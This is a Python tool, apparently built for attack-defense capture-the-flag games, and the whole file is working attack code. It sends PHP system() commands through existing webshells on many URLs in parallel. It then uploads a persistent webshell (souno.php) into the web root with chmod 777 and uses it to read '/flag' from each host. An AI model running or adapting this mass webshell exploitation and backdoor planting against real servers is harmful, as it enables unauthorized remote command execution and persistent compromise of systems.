import base64
import requests
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
from rich import print as rich_print
from typing import Optional

from ip_manager import IPManager


class PHPConnectionTester:
    URLS_FILE: str = "urls.txt"
    OUTPUT_FILE: str = "flags.txt"
    HEADERS: dict = {'Content-Type': 'application/x-www-form-urlencoded'}
    PHP_FILE: str = 'shell/souno.php'
    SHELL_PATH: str = '/'

    def __init__(self):
        self.use_system: bool = False
        self.session = requests.Session()

    def send_request(self, url: str, payload: dict, method: str) -> Optional[requests.Response]:
        try:
            print(payload)
            if method.upper() == 'GET':
                response = self.session.get(url, params=payload, headers=self.HEADERS, timeout=1)
            else:
                response = self.session.post(url, data=payload, headers=self.HEADERS, timeout=1)
            return response
        except requests.exceptions.Timeout:
            rich_print(f"请求 {url} 超时，超时时间为1秒。")
        except requests.exceptions.RequestException as e:
            rich_print(f"请求失败：{e}")
        return None

    def handle_response(self, url: str, response: requests.Response):
        rich_print("=======================================")
        rich_print(f"URL: {url}")
        rich_print(f"状态码: {response.status_code}")
        newline = "\n"
        if response.status_code == 200:
            result = response.text
            rich_print(f"响应: {result}")
            if result == '':
                result = '\n\r'
            with open(self.OUTPUT_FILE, 'a', encoding='utf-8') as file:
                file.write(f"[php][{datetime.now()}] {url} - {result if result == '' else newline}")
        else:
            rich_print("执行命令失败。")
        rich_print("=======================================")

    def test_php_connection(self, url: str, key: str, command: str, method: str = 'POST', use_system: bool = False):
        if not use_system:
            command = f"system('{command}');"
        payload = {key: command}
        response = self.send_request(url, payload, method)
        if response:
            self.handle_response(url, response)

    def test_all_urls(self, key: str, command: str = 'echo "hello"', method: str = 'POST', use_system: bool = False):
        try:
            with open(self.URLS_FILE, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]

            with ThreadPoolExecutor(max_workers=20) as executor:
                future_to_url = {
                    executor.submit(self.test_php_connection, url, key, command, method, use_system): url for url in
                    urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} 异常: {e}")
        except FileNotFoundError:
            rich_print(f"文件未找到: {self.URLS_FILE}")

    def upload(self, key: str, port: str, method: str = 'POST', use_system: bool = False):
        """
        将 PHP shell 上传到给定的 URL，然后向其发送命令。
        """
        ph = open(self.PHP_FILE, "r").read()
        if use_system:
            command = f'echo \'{ph}\' > /var/www/html{self.SHELL_PATH}souno.php'
        else:
            command = f"file_put_contents(\"/var/www/html{self.SHELL_PATH}souno.php\",base64_decode(\"{base64.b64encode(ph)}\"));"
        try:
            with open(self.URLS_FILE, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_url = {
                    executor.submit(self.test_php_connection, url, key, command, method, use_system): url for url in
                    urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} 异常: {e}")
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_url = {
                    executor.submit(self.test_php_connection, url, key, "chmod 777 souno.php", method,
                                    use_system): url for url in urls
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} 异常: {e}")
            with ThreadPoolExecutor(max_workers=10) as executor:
                future_to_url = {
                    executor.submit(self.test_php_connection, url, "souno", "cat /flag", "GET", use_system): url for
                    url in IPManager().generate_urls(port, f"{self.SHELL_PATH}souno.php")
                }
                for future in as_completed(future_to_url):
                    url = future_to_url[future]
                    try:
                        future.result()
                    except Exception as e:
                        rich_print(f"{url} 异常: {e}")
        except FileNotFoundError:
            rich_print(f"文件未找到: {self.URLS_FILE}")
